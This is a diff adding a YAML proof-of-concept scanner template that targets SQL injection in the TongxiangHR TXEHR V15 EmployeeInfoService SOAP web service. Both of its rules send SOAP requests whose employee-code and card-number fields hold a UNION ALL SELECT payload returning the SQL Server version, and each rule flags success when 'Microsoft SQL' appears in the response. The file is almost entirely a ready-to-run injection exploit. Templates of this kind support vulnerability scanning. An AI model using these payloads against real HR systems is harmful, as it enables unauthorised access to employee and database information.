@@ -1,0 +1,50 @@
+name: poc-yaml-tongxiangHR-TXEHR_V15_EmployeeInfoService-sql
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /Service/EmployeeInfoService.asmx
+      headers:
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetEmployeeByCode"
+      body: 
+       "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n\
+        <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n\
+         <soap:Body>\r\n\
+          <GetEmployeeByCode xmlns=\"http://tempuri.org/\">\r\n\
+           <strCode>1' UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</strCode>\r\n\
+          </GetEmployeeByCode>\r\n\
+         </soap:Body>\r\n\
+        </soap:Envelope>\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b'Microsoft SQL')
+
+  r1:
+    request:
+      method: POST
+      path: /Service/EmployeeInfoService.asmx
+      headers:
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetEmployeeByCardNo"
+      body: 
+       "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n\
+        <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n\
+         <soap:Body>\r\n\
+          <GetEmployeeByCardNo xmlns=\"http://tempuri.org/\">\r\n\
+           <strCardNo>1' UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</strCardNo>\r\n\
+          </GetEmployeeByCardNo>\r\n\
+         </soap:Body>\r\n\
+        </soap:Envelope>\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b'Microsoft SQL')
+
+expression: r0() || r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/140987379
